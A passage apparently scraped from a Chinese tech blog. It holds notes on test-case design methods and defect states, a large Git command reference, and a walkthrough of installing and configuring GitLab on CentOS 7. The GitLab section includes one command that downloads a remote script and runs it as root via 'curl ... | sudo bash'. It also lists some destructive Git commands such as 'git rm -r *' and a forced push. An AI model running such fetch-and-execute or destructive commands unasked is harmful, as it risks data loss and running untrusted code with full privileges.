等价类划分法用户所有可能输入的数据，划分成若干份（子集），然后从每一个子集当中选取少数具有代表性的数据作为测试用例 文本框要求输入的长度 输入的类型 组成规则 是否为空 是否重复—区分大小写 是否去除空格 边界值上点：就是指得边界上得点，开区间的话，上点就是在域外，闭区间得话，上点就是在域内。 离点：指得就是离上点最近得点，如果是开区间，那么离点就在域内，如果是闭区间，那么离点就在域外。 内点：域内得任意点都是内点。 边界值的取值需要把上点值、离点值和内点值取到 因果图法​ 等价类划分法和边界值分析方法都是着重考虑输入条件，但没有考虑输入条件的各种组合、输入条件之间的相互制约关系。多个输入条件组合起来可能出错的情况被忽视。 因：输入条件 果：输出条件、出结果 适用于输入条件之间有相互制约、相互依赖的情况 1.互斥：可不选，要选最多选一个。E（Exclude）表示 2.唯一：必选，且只能选一个。O（Only）表示 3.包含：至少选择一个，可以多选。I（Include）表示 4.要求：一个出现，另一个一定出现；反之另一个不确定。R（Required）表示 5.屏蔽：a成立时，b不成立；a不成立时，b的值不一定。M（Masked）表示 使用步骤 找出所有的原因，原因即输入条件或输入条件的等价类 找出所有的结果，结果即输出结果 哪些条件不能组合到一起，哪些可以组合到一起 明确所有输出条件之间的制约关系以及组合关系 哪些输出结果不能同时输出，哪些可以同时输出 找出什么样的输入条件组合会产生哪些输出结果 把因果图转换成判定表/决策表 为判定表/决策表中的每一列表示的情况设计测试用例 判定表法由因果图通过分析得到判定表，再通过判定表编写测试用例 组成 条件桩：问题的所有条件 动作桩：问题的所有输出 条件项：针对条件桩的取值 动作项：条件项的各种取值情况下的输出结果 步骤： 列出所有的条件桩和动作桩 填入条件项 填入动作项。得到初始判定表 简化判定表（合并相似规则（相同动作）） 合并使用“-”代表无关项，选什么都不影响 场景法模拟用户操作软件时的场景，主要用于测试系统的业务流程 基本流 按照正确的业务流程来实现的一条操作路径（模拟正确的操作流程） 备选流 导致程序出现错误的操作流程（模拟错误的操作流程） 在使用场景法设计测试用例时，需要覆盖系统用例中的主成功场景和扩展场景，并且需要适当补充各种正反面的测试用例和考虑出异常场景的情形。 使用场景法测试程序没有问题时，可以再使用边界值、等价类方法对账号、密码进行更加细致、完整的测试 流程分析法针对测试场景类型，属于流程测试场景的测试项下的测试子项 优点 降低了测试用例的设计难度，只要搞清楚各种流程，就可以设计出高质量的测试用例，而且不需要太多测试方面的经验 在测试时间较紧迫的情况下，可以有的放矢的选择测试用例，而不用完全根据经验取舍 步骤； 详细了解需求 根据需求说明或界面原型，找出业务流程的各个页面以及各个页面之间的流转关系 画出业务流程（产品经理使用Axure软件制作） 写用例，覆盖所有的路径分支 错误推断法凭借直觉和推断设计测试用例 正交表常用正交表 正交排列法； 使用最小的测试过程集合获得最大的测试覆盖率 均匀分散，整齐可比 表示：Ln(mk) - n是表的行数，也就是需要测试组合的次数 - k是表的列数，表示控件的个数（因素的个数，或因子个数） - m是每个控件包含的取值个数（各因素的水平数，即各因素的状态数） L9(34) ·有4个控件 ·每个控件有3个取值 ·9为需要测试的组合个数 ·称为4因素3水平 正交排列法使用步骤： 根据所测程序中控件的个数（因素）以及每个控件的取值个数（水平），选取一个合适的正交排列表 把控件及其取值列举出来，并对其进行编号 把控件及其取值映射到正交排列表中 把正交排列表中的ABCD（因子）分别替换成4个控件 把每列中的1,2,3,（状态）分别换成这个控件的3个取值（水平），排列顺序要按照表中给出的顺序 根据映射好的正交排列表编写测试用例 选择正交表 Lx(25) 表中的因素数 &gt;= 5 表中至少有五个因素的水平数 &gt;= 2 行数取最小的一个 结果 L8(27) 局限性 目前常见的正交排列表只有前面附录文件中给出的几种 即使是已有的正交排列表，基本都要求每个控件中取值的个数要相等 混合正交表混合正交表生成工具allpairs 使用步骤： 制作取值表（只列出数据即可，不用编号） 复制取值表的数据，放到文本文档中保存 把文本文档放在allpairs文件夹中 win + r后输入cmd进入控制台 进入allpairs文件夹 在控制台输入allpairs.exe Test2.txt&gt;Test21.txt 测试用例总结 如果测试功能和流程，要使用场景法 如果需要输入数据的地方，使用等价划分法，注意配合边界值法做详细测试 如果有条件组合的情况，使用因果图作出判定表 配置类软件，组合比较多的，使用正交表来科学的选择测试用例 如果没有达到覆盖标准，就要增加一些测试用例 依靠经验追加一些测试用例（错误推断法） 测试用例的力度·最简单的测试用例是测试的纲要，仅仅指出要测试的内容 ·最复杂的测试用例则会指定输入的每项数据，期待的结果即检验方法，具体到界面元素的操作步骤，指定测试的方法和工具等 测试用例的设计也需要迭代，在软件开发的不同阶段都要回来重新评审和完善测试用例 测试用例评审 同行评审 用户评审 软件缺陷定义：缺陷就是软件的问题，最终表现为没有满足用户的需求 属于软件缺陷： 软件未达到规格说明书表明的功能 软件出现了规格说明书中指明不会出现的错误 软件功能超出了规格说明书指明的范围 软件未达到规格说明书虽未指明但应该达到的目标 软件测试人员或用户觉得不好 缺陷的表现形式 功能、特性没有实现或者部分实现 设计不合理、功能不明确、逻辑不清楚或存在矛盾 实际结果和预期结果不同 没有达到规格说明说要求的性能指标 运行出错、崩溃、中断、界面混乱 数据不正确、精度不够、不完整或格式不统一 用户不能接受的其它问题，如存取时间过长、界面不美观 硬件或软件存在其它问题 产生的原因 需求解释或者记录错误 用户需求定义错误 设计说明存在错误 编码说明、程序代码有误 硬件或者软件系统上存在错误 其他，如文档错误，内容不正确或拼写错误 根源 交流不充分 客户与开发人员、开发人员与测试人员 软件的复杂性 功能复杂、开发复杂、测试复杂 开发人员的错误 对需求的理解、开发压力 能力与经验 需求的变化 需求说明书、设计文档、程序的变更 进度压力 项目周期比较紧 缺陷修复费用 从需求规格说明书、设计、编码、测试、发布指数上升 软件缺陷分类 编号 缺陷状态 描述 1 提交(Submited) 已提交的缺陷 2 打开(Open) 确认“提交的缺陷”，等待处理 3 拒绝(Rejected) 拒绝”提交的缺陷”，不需要修复或不是缺陷、重复缺陷、无法重现 4 修复(Resolved) 缺陷被修复 5 关闭(Closed) 确认修复的缺陷，将其关闭 6 推迟(Later) 可在以后解决，但要确定修复日期或版本 提交 – 测试人员提交了一个缺陷给程序员 打开 – 待处理 拒绝 – 程序员认为不是缺陷或者重复，就可以修改状态 为拒绝 修复 – 程序员修复缺陷后提交的一个状态 关闭 – 测试人员经过回归测试后，认为此缺陷已经解 决，将其关闭 推迟 – 可以放在后续版本解决的问题，但是要详细写出 修复的日期或版本","link":"/2022/01/28/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E6%A6%82%E5%BF%B5/"},{"title":"git及github","text":"常见版本控制器集中式版本控制器 CSV/SVN 速度慢，必须联⽹ 只有⼀个中央数据仓库，如果中央数据仓库挂了或者⽆法访问，所有的使⽤者⽆法使⽤SVN， ⽆法 进⾏提交或备份操作 分布式版本控制器 Git ⽆中央服务器，每个⼈的电脑都是⼀个完整的版本库 安全性能更⾼ 通常有⼀台充当“中央服务器”的电脑，仅仅作为⽅便“交换”⼤家的修改 git=混账 Git安装使用 yum 安装 1[root@server1 ~]# yum install git -y 配置本地用户信息(个性化设置) 1234567[root@server1 my_git]# git config --global user.name &quot;xk&quot;[root@server1 my_git]# git config --global user.email &quot;xk@qq.com&quot;[root@server1 my_git]# git config --global color.ui true[root@server1 my_git]# git config --listuser.name=zjuser.email=zj@qq.comcolor.ui=true 创建并初始化版本库 123456789[root@server1 my_git]# pwd/my_git[root@server1 my_git]# git init初始化空的 Git 版本库于 /my_git/.git/[root@server1 my_git]# ls -a. .. .git[root@server1 my_git]# ls .git/branches config description HEAD hooks info objects refs[root@server1 my_git]# 123456789branches # 分支目录config # 定义项目特有的配置选项description # 仅供git web程序使用HEAD # 指示当前的分支hooks # 包含git钩子文件info # 包含一个全局排除文件objects # 本地仓库，存放所有的数据内容，有info和pack两个文件夹refs # 存放指向数据（分支）的提交对象的指针index # 保存暂存信息，在执行git init的时候，这个文件还没有 概念介绍 工作区 当前所在目录就是工作区 暂存区 .git不算⼯作区，只是git的版本库 版本库中只有暂存区和⾃动创建的master分⽀及指向 master的⼀个指针HEAD git跟踪的是每次修改⽽不是⽂件，如果不将修改添加到暂存区是⽆法进⾏提交的 .git隐藏⽬录中⽂件介绍 123456789branches # 分支目录config # 定义项目特有的配置选项description # 仅供git web程序使用HEAD # 指示当前的分支hooks # 包含git钩子文件info # 包含一个全局排除文件objects # 本地仓库，存放所有的数据内容，有info和pack两个文件夹refs # 存放指向数据（分支）的提交对象的指针index # 保存暂存信息，在执行git init的时候，这个文件还没有 常规使用⼀般来说，⽇常使⽤只需要记住下图6个命令。但是熟练使⽤，恐怕要记住60-100个命令。 把文件加到仓库中 1234567[root@server1 my_git]# echo &quot;hello world&quot; &gt; README.txt[root@server1 my_git]# git add README.txt[root@server1 my_git]# git commit -m &quot;write a README.txt file&quot;[master（根提交） 854d889] write a README.txt file1 file changed, 1 insertion(+)create mode 100644 README.txt[root@server1 my_git]# 修改文件内容，查询状态并提交 1234567891011121314151617181920212223242526[root@server1 my_git]# echo &quot;hello xk&quot; &gt;&gt; README.txt[root@server1 my_git]# git status# 位于分支 master# 尚未暂存以备提交的变更：# （使用 &quot;git add &lt;file&gt;...&quot; 更新要提交的内容）# （使用 &quot;git checkout -- &lt;file&gt;...&quot; 丢弃工作区的改动）## 修改： README.txt#修改尚未加入提交（使用 &quot;git add&quot; 和/或 &quot;git commit -a&quot;）[root@server1 my_git]# git add README.txt[root@server1 my_git]# git status# 位于分支 master# 要提交的变更：# （使用 &quot;git reset HEAD &lt;file&gt;...&quot; 撤出暂存区）## 修改： README.txt#[root@server1 my_git]# git commit -m &quot;append hello xk to README.txt&quot;[master 176a262] append hello eagleslab to README.txt1 file changed, 1 insertion(+)[root@server1 my_git]# git status# 位于分支 master无文件要提交，干净的工作区git commit -a 需要交互式输入注释信息 查询文件内容的变动情况 12345678910111213141516[root@server1 my_git]# echo &quot;hello linux&quot; &gt;&gt; README.txt[root@server1 my_git]# git diff README.txtdiff --git a/README.txt b/README.txtindex c97f01c..b09e4cc 100644--- a/README.txt+++ b/README.txt@@ -1,2 +1,3 @@hello worldhello eagleslab+hello linux[root@server1 my_git]# git commit -a -m &quot;append hello linux to README.txt&quot;[master ca3e26c] append hello linux to README.txt1 file changed, 1 insertion(+)[root@server1 my_git]# git status# 位于分支 master无文件要提交，干净的工作区 查询历史记录并退回 12345678910111213141516171819202122[root@server1 my_git]# git logcommit ca3e26c8f13e11f487c569b3b099d27b7661d067Author: zj &lt;zj@qq.com&gt;Date: Tue Apr 20 20:36:01 2021 +0800append hello linux to README.txtcommit 176a26251d17eee0ad37cefd35eeb945539cacb3Author: zj &lt;zj@qq.com&gt;Date: Tue Apr 20 20:33:05 2021 +0800append hello eagleslab to README.txtcommit 854d889c17ce2aa90101a2f6d40a7be511e6b4b5Author: zj &lt;zj@qq.com&gt;Date: Tue Apr 20 20:29:49 2021 +0800write a README.txt file[root@server1 my_git]# git log --onelineca3e26c append hello linux to README.txt176a262 append hello eagleslab to README.txt854d889 write a README.txt file[root@server1 my_git]# git reset --hard 176a262HEAD 现在位于 176a262 append hello eagleslab to README.txt[root@server1 my_git]# cat README.txthello worldhello eagleslab 查看所有历史记录 1234567891011121314[root@server1 my_git]# git logcommit 176a26251d17eee0ad37cefd35eeb945539cacb3Author: zj &lt;zj@qq.com&gt;Date: Tue Apr 20 20:33:05 2021 +0800append hello eagleslab to README.txtcommit 854d889c17ce2aa90101a2f6d40a7be511e6b4b5Author: zj &lt;zj@qq.com&gt;Date: Tue Apr 20 20:29:49 2021 +0800write a README.txt file[root@server1 my_git]# git reflog176a262 HEAD@{0}: reset: moving to 176a262ca3e26c HEAD@{1}: commit: append hello linux to README.txt176a262 HEAD@{2}: commit: append hello eagleslab to README.txt854d889 HEAD@{3}: commit (initial): write a README.txt file 修改文件名称 12345678910111213141516171819202122方式一[root@server1 my_git]# mv README.txt readme.txt[root@server1 my_git]# git add readme.txt[root@server1 my_git]# git commit -m &quot;rename README.txt to readme.txt&quot;[master bc08fbb] rename README.txt to readme.txt1 file changed, 2 insertions(+)create mode 100644 readme.txt[root@server1 my_git]# git status# 位于分支 master无文件要提交，干净的工作区方式二[root@server1 my_git]# git mv readme.txt README.txt[root@server1 my_git]# git commit -a -m &quot;rename readme.txt to README.txt&quot;[master 6599d6c] rename readme.txt to README.txt1 file changed, 0 insertions(+), 0 deletions(-)rename readme.txt =&gt; README.txt (100%)[root@server1 my_git]# git status# 位于分支 master无文件要提交，干净的工作区[root@server1 my_git]# lsREADME.txt[root@server1 my_git]# 删除文件 12345678910[root@server1 my_git]# git rm README.txtrm 'README.txt'[root@server1 my_git]# git commit -m &quot;delete README.txt&quot;[master 84b4a87] delete README.txt1 file changed, 2 deletions(-)delete mode 100644 README.txt[root@server1 my_git]# git status# 位于分支 master无文件要提交，干净的工作区[root@server1 my_git]# ls 停止跟踪文件 12345678910111213141516171819202122[root@server1 my_git]# git log --oneline84b4a87 delete README.txt6599d6c rename readme.txt to README.txtbc08fbb rename README.txt to readme.txt8df8928 rename README.txt to readme.txt176a262 append hello eagleslab to README.txt854d889 write a README.txt file[root@server1 my_git]# git reset --hard 6599d6cHEAD 现在位于 6599d6c rename readme.txt to README.txt[root@server1 my_git]# lsREADME.txt[root@server1 my_git]# git rm README.txt --cachedrm 'README.txt'[root@server1 my_git]# lsREADME.txt[root@server1 my_git]# git commit -m &quot;delete README.txt cached&quot;[master 4e3d233] delete README.txt cached1 file changed, 2 deletions(-)delete mode 100644 README.txt[root@server1 my_git]# lsREADME.txt[root@server1 my_git]# 分支 分支就是平行空间，假设你在某个手机系统研发拍照功能，代码已经完成了80%，但 如果将这不 完整的代码直接提交到git仓库中，又有可能影响到其他人的工作，此时我们便可以在该软件的项 目之上创建一个名叫拍照的分支，这种分支只会属于你自己，而其他人看不到，等代码编写完成后 再与原来的项目主分支合并即可，这样既能保证代码不丢失，又不影响其他人工作。 一般在实际的项目开发中，尽量保持master分支是非常稳定的，仅用于发布新版本，平时不要随 便直接修改里面的数据文件，而工作的时候则可以新建不同的工作分支，等到工作完成后再合并到 master分支上面，所以团队的合作分支看起来会像很多树枝一样。 1234567891011121314151617181920212223242526272829303132333435# 列出所有本地分⽀$ git branch# 列出所有远程分⽀$ git branch -r# 列出所有本地分⽀和远程分⽀$ git branch -a# 新建⼀个分⽀，但依然停留在当前分⽀$ git branch [branch-name]# 新建⼀个分⽀，并切换到该分⽀$ git checkout -b [branch]# 新建⼀个分⽀，指向指定commit$ git branch [branch] [commit]# 新建⼀个分⽀，与指定的远程分⽀建⽴追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分⽀，并更新⼯作区$ git checkout [branch-name]# 切换到上⼀个分⽀$ git checkout -# 建⽴追踪关系，在现有分⽀与指定的远程分⽀之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分⽀到当前分⽀$ git merge [branch]# 选择⼀个commit，合并进当前分⽀$ git cherry-pick [commit]# 删除分⽀$ git branch -d [branch-name]# 删除远程分⽀$ git push origin --delete [branch-name]$ git branch -dr [remote/branch]# 检出版本v2.0$ git checkout v2.0# 从远程分⽀develop创建新本地分⽀devel并检出$ git checkout -b devel origin/develop# 检出head版本的README⽂件（可⽤于修改错误回退）git checkout -- README 标签使用 标签也是指向了一次commit提交，是一个里程碑式的标签，回滚打标签直接加标签号，不需要加 唯一字符串。 123456789101112131415161718192021222324252627282930# 给当前状态打标签git tag -a v1.0 -m &quot; version 1.0&quot;# 指定某次状态打标签git tag -a v2.0 [哈希值] -m &quot;version 2.0&quot;# 查看所有标签信息git tag# 查看指定标签信息git show v1.0# 删除标签$ git tag -d v1.0# 以标签回滚git reset --hard v2.0# 列出所有tag$ git tag# 新建⼀个tag在当前commit$ git tag [tag]# 新建⼀个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建⼀个分⽀，指向某个tag$ git checkout -b [branch] [tag] 远程同步12345678910111213141516# 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加⼀个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分⽀合并$ git pull [remote] [branch]# 上传本地指定分⽀到远程仓库$ git push [remote] [branch]# 强⾏推送当前分⽀到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分⽀到远程仓库$ git push [remote] --all 撤销12345678910111213141516171819202122# 恢复暂存区的指定⽂件到⼯作区$ git checkout [file]# 恢复某个commit的指定⽂件到暂存区和⼯作区$ git checkout [commit] [file]# 恢复暂存区的所有⽂件到⼯作区$ git checkout .# 重置暂存区的指定⽂件，与上⼀次commit保持⼀致，但⼯作区不变$ git reset [file]# 重置暂存区与⼯作区，与上⼀次commit保持⼀致$ git reset --hard# 重置当前分⽀的指针为指定commit，同时重置暂存区，但⼯作区不变$ git reset [commit]# 重置当前分⽀的HEAD为指定commit，同时重置暂存区和⼯作区，与指定commit⼀致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和⼯作区不变$ git reset --keep [commit]# 新建⼀个commit，⽤来撤销指定commit# 后者的所有变化都将被前者抵消，并且应⽤到当前分⽀$ git revert [commit]# 暂时将未提交的变化移除，稍后再移⼊$ git stash$ git stash pop 其他git操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697git init # 初始化本地git仓库（创建新仓库）git config --global user.name &quot;xxx&quot; # 配置用户名git config --global user.email &quot;xxx@xxx.com&quot; # 配置邮件git config --global color.ui true # git status等命令自动着色git config --global color.status autogit config --global color.diff autogit config --global color.branch autogit config --global color.interactive autogit config --global --unset http.proxy # remove proxyconfiguration on gitgit clone git+ssh://git@192.168.53.168/VT.git # clone远程仓库git status # 查看当前版本状态（是否修改）git add xyz # 添加xyz文件至indexgit add . # 增加当前子目录下所有更改过的文件至indexgit commit -m 'xxx' # 提交git commit --amend -m 'xxx' # 合并上一次提交（用于反复修改）git commit -am 'xxx' # 将add和commit合为一步git rm xxxgit rm -r * # 递归删除git log # 显示提交日志git log -1 # 显示1行日志 -n为n行git log -5git log --stat # 显示提交日志及相关变动文件git log -p -mgit show dfb02e6e4f2f7b573337763e5c0013802e392818 # 显示某个提交的详细内容git show dfb02 # 可只用commitid的前几位git show HEAD # 显示HEAD提交日志git show HEAD^ # 显示HEAD的父（上一个版本）的提交日志 ^^为上两个版本 ^5为上5个版本git tag # 显示已存在的taggit tag -a v2.0 -m 'xxx' # 增加v2.0的taggit show v2.0 # 显示v2.0的日志及详细内容git log v2.0 # 显示v2.0的日志git diff # 显示所有未添加至index的变更git diff --cached # 显示所有已添加index但还未commit的变更git diff HEAD^ # 比较与上一个版本的差异git diff HEAD -- ./lib # 比较与HEAD版本lib目录的差异git diff origin/master..master # 比较远程分支master上有本地分支master上没有的git diff origin/master..master --stat # 只显示差异的文件，不显示具体内容git remote add origin git+ssh://git@192.168.53.168/VT.git # 增加远程定义（用于push/pull/fetch）git branch # 显示本地分支git branch --contains 50089 # 显示包含提交50089的分支git branch -a # 显示所有分支git branch -r # 显示所有原创分支git branch --merged # 显示所有已合并到当前分支的分支git branch --no-merged # 显示所有未合并到当前分支的分支git branch -m master master_copy # 本地分支改名git checkout -b master_copy # 从当前分支创建新分支master_copy并检出git checkout -b master master_copy # 上面的完整版git checkout features/performance # 检出已存在的features/performance分支git checkout --track hotfixes/BJVEP933 # 检出远程分支hotfixes/BJVEP933并创建本地跟踪分支git checkout v2.0 # 检出版本v2.0git checkout -b devel origin/develop # 从远程分支develop创建新本地分支devel并检出git checkout -- README # 检出head版本的README文件（可用于修改错误回退）git merge origin/master # 合并远程master分支至当前分支git cherry-pick ff44785404a8e # 合并提交ff44785404a8e的修改git push origin master # 将当前分支push到远程master分支git push origin :hotfixes/BJVEP933 # 删除远程仓库的hotfixes/BJVEP933分支git push --tags # 把所有tag推送到远程仓库git fetch # 获取所有远程分支（不更新本地分支，另需merge）git fetch --prune # 获取所有原创分支并清除服务器上已删掉的分支git pull origin master # 获取远程分支master并merge到当前分支git mv README README2 # 重命名文件README为README2git reset --hard HEAD # 将当前版本重置为HEAD（通常用于merge失败回退）git rebasegit branch -d hotfixes/BJVEP933 # 删除分支hotfixes/BJVEP933（本分支修改已合并到其他分支）git branch -D hotfixes/BJVEP933 # 强制删除分支hotfixes/BJVEP933git ls-files # 列出git index包含的文件git show-branch # 图示当前分支历史git show-branch --all # 图示所有分支历史git whatchanged # 显示提交历史对应的文件修改git revert dfb02e6e4f2f7b573337763e5c0013802e392818 # 撤销提交dfb02e6e4f2f7b573337763e5c0013802e392818git ls-tree HEAD # 内部命令：显示某个git对象git rev-parse v2.0 # 内部命令：显示某个ref对于的SHA1 HASHgit reflog # 显示所有提交，包括孤立节点git show HEAD@{5}git show master@{yesterday} # 显示master分支昨天的状态git log --pretty=format:'%h %s' --graph # 图示提交日志git show HEAD~3git show -s --pretty=raw 2be7fcb476git stash # 暂存当前修改，将所有至为HEAD状态git stash list # 查看所有暂存git stash show -p stash@{0} # 参考第一次暂存git stash apply stash@{0} # 应用第一次暂存git grep &quot;delete from&quot; # 文件中搜索文本“delete from”git grep -e '#define' --and -e SORT_DIRENTgit gcgit fsck# 生成一个可供发布的压缩包$ git archive GitHubGitHub故名思义是一个git版本库的托管服务，是目前全球最大的软件仓库，拥有成千上百万的开发者用 户，也是软件开发和寻找资源的最佳途径，GitHub不仅可以托管各种git版本库，还拥有更美观的web界 面，你的代码可以被任何人克隆，使得开发者为开源贡献代码变得更加容易，当然也可以付费够没私有 库，这样高性价比的私有库真的是帮助到了很多企业。 注册用户 配置ssh-key 创建项目 添加远程仓库 1git remote add origin git@github.com:bbj1030/testing.git 推送新代码到GitHub 1git push -u origin master 克隆项目到本地 1git clone git@github.com:bbj1030/testing.git GitlabGitLab - 安装并启动GitLab CentOS 7 下 GitLab安装部署教程 - Ken的杂谈 安装依赖关系 12345yum install -y curl openssh-server policycoreutils-pythonsystemctl enable sshdsystemctl start sshdfirewall-cmd --permanent --add-service=httpsystemctl reload firewall 下载安装包(rpm) 123wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-10.0.0-ce.0.el7.x86_64.rpmrpm -ivh [包名] yum安装 修改配置文件并启动gitlab 日常管理命令 12345gitlab-ctl startgitlab-ctl stopgitlab-ctl statusgitlab-ctl restartgitlab-ctl reconfigure 简单使用 root登录gitlab 创建test组 创建test项目 添加ssh密钥 添加新用户 将新用户添加到组里 新用户登录就可以拥有项目代码 1 - GitLab安装1.1 信息确认12345[Anliven@node102 ~]$ uname -aLinux node102 3.10.0-957.el7.x86_64 #1 SMP Thu Nov 8 23:39:32 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux[Anliven@node102 ~]$ cat /etc/system-releaseCentOS Linux release 7.5.1804 (Core) [Anliven@node102 ~]$ 1.2 准备步骤12345678910111213# 安装依赖sudo yum install -y curl policycoreutils-python openssh-server postfix# 启动SSH和postfixsudo systemctl enable sshdsudo systemctl start sshdsudo systemctl enable postfixsudo systemctl start postfix# 开放端口sudo firewall-cmd --add-service=ssh --permanentsudo firewall-cmd --add-service=http --permanentsudo firewall-cmd --reload 1.3 安装方式1：Yum12curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bashsudo yum install -y gitlab-ce 1.4 安装方式2：下载并安装rpm包清华镜像：https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/ 注意：可以单独下载RPM包，然后上传到Server，要节约时间点。 12wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-12.5.0-ce.0.el7.x86_64.rpmrpm -i gitlab-ce-12.5.0-ce.0.el7.x86_64.rpm 2 - 初始化配置GitLab默认的配置文件路径：/etc/gitlab/ /etc/gitlab/gitlab.rb：主配置文件，包含外部URL、仓库目录、备份目录等 /etc/gitlab/gitlab-secrets.json：（执行gitlab-ctl reconfigure命令行后生成），包含各类密钥的加密信息 2.1 初始化配置 配置首页地址（需将设置的域名DNS解析到服务器IP，或者修改本地host将域名指向服务器IP） 修改服务端口，避免和其他服务端口冲突 重新配置并启动，使配置生效，并确认相关组件或进程的状态 设置账号密码和管理员信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115[root@node102 ~]# ll /etc/gitlab/total 96-rw------- 1 root root 97727 Nov 26 23:05 gitlab.rb[root@node102 ~]# [root@node102 ~]# cat /etc/gitlab/gitlab.rb |grep -v &quot;#&quot; |grep -Ev &quot;^$&quot;external_url 'http://gitlab.example.com'[root@node102 ~]# [root@node102 ~]# vim /etc/gitlab/gitlab.rb[root@node102 ~]# [root@node102 ~]# cat /etc/gitlab/gitlab.rb |grep -v &quot;#&quot; |grep -Ev &quot;^$&quot;external_url 'http://192.168.16.102'unicorn['listen'] = '192.168.16.102'unicorn['port'] = 8081[root@node102 ~]# [root@test102 ~]# gitlab-ctl diff-configdiff --git a/etc/gitlab/gitlab.rb b/opt/gitlab/etc/gitlab.rb.templateindex 3e27e40..31c0b45 100644--- a/etc/gitlab/gitlab.rb+++ b/opt/gitlab/etc/gitlab.rb.template@@ -20,7 +20,7 @@ ##! URL on which GitLab will be reachable. ##! For more details on configuring external_url see: ##! https://docs.gitlab.com/omnibus/settings/configuration.html#configuring-the-external-url-for-gitlab-external_url 'http://192.168.16.102'+external_url 'GENERATED_EXTERNAL_URL' ## Roles for multi-instance GitLab ##! The default is to have no roles enabled, which results in GitLab running as an all-in-one instance.@@ -740,8 +740,8 @@ external_url 'http://192.168.16.102' # unicorn['worker_processes'] = 2 ### Advanced settings-unicorn['listen'] = '192.168.16.102'-unicorn['port'] = 8081+# unicorn['listen'] = 'localhost'+# unicorn['port'] = 8080 # unicorn['socket'] = '/var/opt/gitlab/gitlab-rails/sockets/gitlab.socket' # unicorn['pidfile'] = '/opt/gitlab/var/unicorn/unicorn.pid' # unicorn['tcp_nopush'] = true[root@test102 ~]# [root@node102 ~]# firewall-cmd --zone=public --permanent --add-port=8081/tcpsuccess[root@node102 ~]# firewall-cmd --reloadsuccess[root@node102 ~]# [root@node102 ~]# firewall-cmd --list-allpublic (active) target: default icmp-block-inversion: no interfaces: enp0s3 enp0s8 sources: services: ssh dhcpv6-client http ports: 8081/tcp protocols: masquerade: no forward-ports: source-ports: icmp-blocks: rich rules: [root@node102 ~]# [root@node102 ~]# gitlab-ctl reconfigureStarting Chef Client, version 14.13.11resolving cookbooks for run list: [&quot;gitlab&quot;]Synchronizing Cookbooks: - gitlab (0.0.1) - package (0.1.0) - postgresql (0.1.0) - redis (0.1.0) - monitoring (0.1.0) - registry (0.1.0) - mattermost (0.1.0) - consul (0.1.0) - gitaly (0.1.0) - nginx (0.1.0) - praefect (0.1.0) - letsencrypt (0.1.0) - runit (4.3.0) - acme (4.0.0) - crond (0.1.0)Installing Cookbook Gems:Compiling Cookbooks...Recipe: gitlab::default..................Recipe: &lt;Dynamically Defined Resource&gt; * service[alertmanager] action restart - restart service service[alertmanager] * service[postgres-exporter] action restart - restart service service[postgres-exporter] * service[grafana] action restart - restart service service[grafana]Running handlers:Running handlers completeChef Client finished, 543/1455 resources updated in 04 minutes 09 secondsgitlab Reconfigured![root@node102 ~]# [root@node102 ~]# gitlab-ctl statusrun: alertmanager: (pid 6469) 45s; run: log: (pid 6123) 128srun: gitaly: (pid 6335) 50s; run: log: (pid 5516) 263srun: gitlab-exporter: (pid 6380) 48s; run: log: (pid 5972) 146srun: gitlab-workhorse: (pid 6358) 49s; run: log: (pid 5882) 174srun: grafana: (pid 6529) 44s; run: log: (pid 6273) 74srun: logrotate: (pid 5920) 159s; run: log: (pid 5929) 158srun: nginx: (pid 5893) 171s; run: log: (pid 5905) 167srun: node-exporter: (pid 6367) 49s; run: log: (pid 5960) 152srun: postgres-exporter: (pid 6488) 45s; run: log: (pid 6150) 121srun: postgresql: (pid 5632) 255s; run: log: (pid 5644) 254srun: prometheus: (pid 6406) 47s; run: log: (pid 6080) 132srun: redis: (pid 5471) 272s; run: log: (pid 5479) 271srun: redis-exporter: (pid 6384) 48s; run: log: (pid 6003) 140srun: sidekiq: (pid 5842) 183s; run: log: (pid 5853) 180srun: unicorn: (pid 5803) 189s; run: log: (pid 5835) 186s[root@node102 ~]# 2.2 登录http://192.168.16.102 注意：这个地址是“external_url ‘http://192.168.16.102’” 首次登录显示为密码设置界面，设置管理员密码，管理员账号默认username是root 设置完成之后，刷新即可使用root账号登录，登陆后会进入欢迎界面。 2.3 更新管理员资料 2.4 查看管理员面板Admin Area的主面板显示整体数据，左侧导航菜单可以查看具体的分类信息 2.5 创建新用户方式1：管理员直接创建用户Admin Area —》New user，根据规则和需要分别设置Account、Access部分，Password部分可以由本人进行设置。 查看邮箱，点击邮件中的链接，设置密码并登陆 方式2：用户直接注册新的账户在GitLab登录界面，直接点击“Register”，添加用户相关信息。 3 - GitLab常用配置3.1 配置Git存储仓库目录默认存储目录为/var/opt/gitlab/git-data/repositories 1234[root@test102 ~]# ll /var/opt/gitlab/git-data/total 0drwxrws--- 3 git root 45 Nov 27 13:53 [root@test102 ~]# 如果要更新或增加存储仓库目录，可以修改/etc/gitlab/gitlab.rb配置文件中git_data_dirs部分的内容，然后执行“gitlab-ctl reconfigure”命令使之生效。 例如： 1234git_data_dirs({ &quot;default&quot; =&gt; {&quot;path&quot; =&gt; &quot;/var/opt/gitlab/git-data&quot;} &quot;newrepo&quot; =&gt; {&quot;path&quot; =&gt; &quot;/mnt/nfs-01/git-data&quot;}}) 特别注意： 